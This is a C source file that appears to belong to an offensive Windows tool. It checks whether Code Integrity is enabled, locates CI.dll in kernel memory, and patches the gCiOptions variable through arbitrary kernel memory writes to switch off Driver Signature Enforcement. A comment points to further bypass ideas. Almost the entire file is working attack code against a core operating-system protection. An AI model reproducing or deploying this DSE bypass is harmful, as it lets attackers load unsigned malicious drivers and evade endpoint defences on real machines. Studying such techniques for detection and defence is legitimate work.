#include "windows.h"
#include "KernelDSE.h"
#include "winternl.h"
#include "KernelCallbacks.h"
#include "NtoskrnlOffsets.h"
#include "PrintFunctions.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "tchar.h"


 BOOLEAN IsCiEnabled()
{
	SYSTEM_CODEINTEGRITY_INFORMATION CiInfo = { sizeof(SYSTEM_CODEINTEGRITY_INFORMATION) };
	const NTSTATUS Status = NtQuerySystemInformation(SystemCodeIntegrityInformation,
		&CiInfo,
		sizeof(CiInfo),
		NULL);
	if (!NT_SUCCESS(Status))
		printf_or_not("[-] Failed to query code integrity status: %08X\n", Status);

	return (CiInfo.CodeIntegrityOptions &
		(CODEINTEGRITY_OPTION_ENABLED | CODEINTEGRITY_OPTION_TESTSIGN)) == CODEINTEGRITY_OPTION_ENABLED;
}

 DWORD64 FindCIBaseAddress() {
     DWORD64 CiBaseAddress = FindKernelModuleAddressByName(TEXT("CI.dll"));
     return CiBaseAddress;
 }

 /*
 * Patches the gCiOptions global variable in CI.dll module to enable/disable DSE
 * Warning: this technique does not work with KDP enabled (by default on Win 11).
 * TODO: see https://www.fortinet.com/blog/threat-research/driver-signature-enforcement-tampering for ideas of new bypasses
 */
 BOOL patch_gCiOptions(DWORD64 CiVariableAddress, ULONG CiOptionsValue, PULONG OldCiOptionsValue) {//PRFIX : not KDP proof
     *OldCiOptionsValue = ReadMemoryDWORD(CiVariableAddress);
     //printf("[+KERNELDSE] The value of gCI at 0x%llx is 0x%x.\n", CiVariableAddress, *OldCiOptionsValue);
     WriteMemoryDWORD(CiVariableAddress, CiOptionsValue);
     //printf("[+KERNELDSE] New value of gCI at 0x%llx is 0x%x.\n", CiVariableAddress, ReadMemoryDWORD64(CiVariableAddress));
     return TRUE;
 }
